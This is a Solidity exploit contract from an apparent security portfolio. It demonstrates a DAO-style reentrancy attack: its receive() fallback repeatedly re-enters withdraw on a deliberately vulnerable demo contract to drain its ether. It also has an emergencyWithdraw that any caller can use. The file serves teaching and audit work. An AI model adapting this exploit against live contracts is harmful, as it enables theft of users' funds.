// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./VulnerableDAO.sol";

/**
 * @title ReentrancyAttacker - Exploit Contract for DAO Reentrancy Attack
 * @author Security Audit Portfolio
 * @notice This contract demonstrates the reentrancy attack against VulnerableDAO
 * @dev FOR EDUCATIONAL PURPOSES ONLY - Demonstrates the 2016 DAO hack technique
 */
contract ReentrancyAttacker {
    VulnerableDAO public immutable dao;
    uint256 public constant ATTACK_AMOUNT = 1 ether;
    uint256 private attackCount;
    uint256 private maxAttacks;
    
    bool private attacking;
    
    event AttackInitiated(uint256 initialBalance, uint256 targetAmount);
    event AttackStep(uint256 step, uint256 contractBalance, uint256 attackerBalance);
    event AttackCompleted(uint256 totalExtracted, uint256 originalInvestment);
    
    constructor(address _dao) {
        dao = VulnerableDAO(_dao);
    }
    
    /**
     * @notice Execute the reentrancy attack
     * @dev This function orchestrates the full attack sequence
     * @param _maxAttacks Maximum number of reentrant calls to prevent infinite loop
     */
    function attack(uint256 _maxAttacks) external payable {
        require(msg.value >= ATTACK_AMOUNT, "Need at least 1 ETH to attack");
        require(!attacking, "Attack already in progress");
        
        maxAttacks = _maxAttacks;
        attacking = true;
        attackCount = 0;
        
        uint256 initialBalance = dao.getContractBalance();
        
        // Step 1: Join the DAO as a legitimate member
        dao.joinDAO{value: ATTACK_AMOUNT}();
        
        emit AttackInitiated(initialBalance, ATTACK_AMOUNT);
        
        // Step 2: Initiate the reentrancy attack
        dao.withdraw(ATTACK_AMOUNT);
        
        attacking = false;
        
        uint256 totalExtracted = address(this).balance;
        emit AttackCompleted(totalExtracted, ATTACK_AMOUNT);
    }
    
    /**
     * @notice Initialize attack with proper funding
     * @dev Alternative entry point that handles funding properly
     */
    function initializeAttack(uint256 _maxAttacks) external {
        require(address(this).balance >= ATTACK_AMOUNT, "Insufficient balance");
        require(!attacking, "Attack already in progress");
        
        maxAttacks = _maxAttacks;
        attacking = true;
        attackCount = 0;
        
        uint256 initialBalance = dao.getContractBalance();
        
        // Step 1: Join the DAO as a legitimate member
        dao.joinDAO{value: ATTACK_AMOUNT}();
        
        emit AttackInitiated(initialBalance, ATTACK_AMOUNT);
        
        // Step 2: Initiate the reentrancy attack
        dao.withdraw(ATTACK_AMOUNT);
        
        attacking = false;
        
        uint256 totalExtracted = address(this).balance;
        emit AttackCompleted(totalExtracted, ATTACK_AMOUNT);
    }
    
    /**
     * @notice Fallback function that implements the reentrancy logic
     * @dev This is called during the DAO's withdraw function, enabling reentrancy
     */
    receive() external payable {
        if (attacking && attackCount < maxAttacks) {
            attackCount++;
            
            uint256 daoBalance = dao.getContractBalance();
            uint256 attackerDAOBalance = dao.getBalance(address(this));
            
            emit AttackStep(attackCount, daoBalance, attackerDAOBalance);
            
            // Continue the attack if conditions are met
            if (attackerDAOBalance >= ATTACK_AMOUNT && daoBalance >= ATTACK_AMOUNT) {
                dao.withdraw(ATTACK_AMOUNT);
            }
        }
    }
    
    /**
     * @notice Get the current attack status
     * @return isAttacking Whether an attack is currently in progress
     * @return currentStep Current step number in the attack
     * @return maxSteps Maximum number of steps configured
     */
    function getAttackStatus() external view returns (bool isAttacking, uint256 currentStep, uint256 maxSteps) {
        return (attacking, attackCount, maxAttacks);
    }
    
    /**
     * @notice Get the attacker's balance in the DAO
     * @return Balance in the vulnerable DAO contract
     */
    function getDAOBalance() external view returns (uint256) {
        return dao.getBalance(address(this));
    }
    
    /**
     * @notice Get the DAO contract's total balance
     * @return Total ETH held by the DAO contract
     */
    function getDAOContractBalance() external view returns (uint256) {
        return dao.getContractBalance();
    }
    
    /**
     * @notice Get this contract's ETH balance
     * @return ETH balance of this attacker contract
     */
    function getAttackerBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @notice Emergency function to withdraw stolen funds (for testing)
     * @dev Only for demonstration purposes in test environment
     */
    function emergencyWithdraw() external {
        require(!attacking, "Cannot withdraw during attack");
        payable(msg.sender).transfer(address(this).balance);
    }
}